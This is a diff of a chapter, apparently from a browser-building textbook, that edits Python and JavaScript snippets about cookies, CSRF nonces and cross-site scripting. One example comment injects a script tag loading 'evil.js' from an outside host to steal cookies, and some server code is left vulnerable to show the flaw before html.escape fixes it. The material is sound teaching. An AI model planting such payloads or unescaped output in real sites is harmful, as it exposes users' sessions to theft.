@@ -86,11 +86,12 @@ def handle_connection(conx):
 Of course, new visitors need to be told to remember their
 newly-generated token:
 
-``` {.python file=server}
+``` {.python file=server replace={}/{};%20SameSite=Lax}
 def handle_connection(conx):
     # ...
     if 'cookie' not in headers:
-        response += "Set-Cookie: token={}\r\n".format(token)
+        template = "Set-Cookie: token={}\r\n"
+        response += template.format(token)
     # ...
 ```
 
@@ -182,11 +183,12 @@ ENTRIES = [
 
 When we print the guest book entries, print the username as well:
 
-``` {.python file=server}
+``` {.python file=server replace=+%20entry/+%20html.escape(entry),+%20who/+%20html.escape(who)}
 def show_comments(session):
     # ...
     for entry, who in ENTRIES:
-        out += '<p>' + entry + " <i>from " + who + '</i></p>'
+        out += "<p>" + entry + "\n"
+        out += "<i>by " + who + "</i></p>"
     # ...
 ```
 
@@ -447,7 +449,7 @@ I'll implement a minimal version here. Specifically, I'll support only
 
 [xhr-open]: https://xhr.spec.whatwg.org/#the-open()-method
 
-``` {.javascript}
+``` {.javascript.example}
 x = new XMLHttpRequest();
 x.open("GET", url, false);
 x.send();
@@ -548,8 +550,7 @@ could request the guest book page:
     ads on sketchy websites where users have low standards for
     security anyway.
 
-
-``` {.javascript}
+``` {.javascript.example}
 x = new XMLHttpRequest();
 x.open("GET", "http://localhost:8000/", false);
 x.send();
@@ -695,7 +696,7 @@ def show_comments(session):
         nonce = str(random.random())[2:]
         session["nonce"] = nonce
         # ...
-        out += "<input name=nonce type=hidden value=" + nonce + ">"
+        out +=   "<input name=nonce type=hidden value=" + nonce + ">"
 ```
 
 When a form is submitted, the server checks that the right nonce is
@@ -912,8 +913,9 @@ benign---doesn't our server only run `comment.js`? But in fact...
 A web service needs to defend itself from being *misused*. Consider
 the code in our guest book that outputs guest book entries:
 
-``` {.python file=server indent=8}
-out += "<p>" + entry + " <i>by " + who + "</i></p>"
+``` {.python file=server indent=8 replace=entry/html.escape(entry),who/html.escape(who)}
+out += "<p>" + entry + "\n"
+out += "<i>by " + who + "</i></p>"
 ```
 
 Note that `entry` can be anything, anything the user might stick into
@@ -925,7 +927,7 @@ tag! So, a malicious user could post this comment:
 The server would then output this HTML:
 
     <p>Hi! <script src="http://my-server/evil.js"></script>
-    <i> by crashoverride</i></p>
+    <i>by crashoverride</i></p>
 
 Every user's browser would then download and run the `evil.js` script,
 which can send[^document-cookie][^cross-domain][^how-send] the cookies
@@ -969,10 +971,10 @@ encoding:
 ``` {.python file=server}
 import html
 
-def show_comments(username):
+def show_comments(session):
     # ...
-    out += "<p>" + html.escape(entry)
-    out += " <i>from " + html.escape(who) + "</i></p>"
+    out += "<p>" + html.escape(entry) + "\n"
+    out += "<i>by " + html.escape(who) + "</i></p>"
     # ...
 ```
 
